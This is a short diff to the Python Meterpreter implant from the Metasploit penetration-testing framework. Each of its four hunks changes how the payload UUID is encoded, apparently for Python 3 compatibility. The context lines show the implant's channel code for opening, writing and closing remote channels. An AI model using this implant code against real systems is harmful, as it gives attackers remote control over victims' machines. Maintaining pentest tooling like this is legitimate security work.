@@ -859,7 +859,7 @@ class PythonMeterpreter(object):
 						client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
 						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 						pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
-						pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+						pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
 						pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
 						pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
@@ -871,7 +871,7 @@ class PythonMeterpreter(object):
 				if data:
 					pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 					pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
-					pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+					pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 					pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 					pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
 					pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
@@ -885,7 +885,7 @@ class PythonMeterpreter(object):
 			self.interact_channels.remove(channel_id)
 		pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 		pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_close')
-		pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+		pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
@@ -1155,7 +1155,7 @@ class PythonMeterpreter(object):
 		resp = struct.pack('>I', PACKET_TYPE_RESPONSE)
 		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
 		resp += tlv_pack(method_tlv)
-		resp += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+		resp += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 
 		handler_name = method_tlv['value']
 		if handler_name in self.extension_functions:
